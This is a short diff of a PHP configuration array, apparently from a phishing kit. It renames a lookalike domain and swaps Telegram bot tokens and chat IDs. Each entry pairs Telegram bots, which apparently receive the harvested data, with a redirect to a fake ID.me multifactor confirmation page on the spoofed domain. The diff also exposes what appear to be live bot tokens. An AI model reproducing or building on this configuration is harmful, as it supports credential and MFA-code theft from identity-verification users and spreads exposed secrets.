@@ -105,12 +105,12 @@ $site_map = [
     ],
 
 
-    'credibleloans.info' => [
+    'crediblepath.info' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '8391318694:AAFIHmYNa3k9HPokaeVJ7oxtWn2UB_iJiUI', 'chat_id' => '7982337001']
+            ['token' => '8664835392:AAFSRnPXaE6ZmXYfQGZYzvtgyaCgLYLmmAU', 'chat_id' => '6772487570']
         ],
-        'redirect' => 'https://credibleloans.info/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
+        'redirect' => 'https://crediblepath.info/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
     ],
 
 
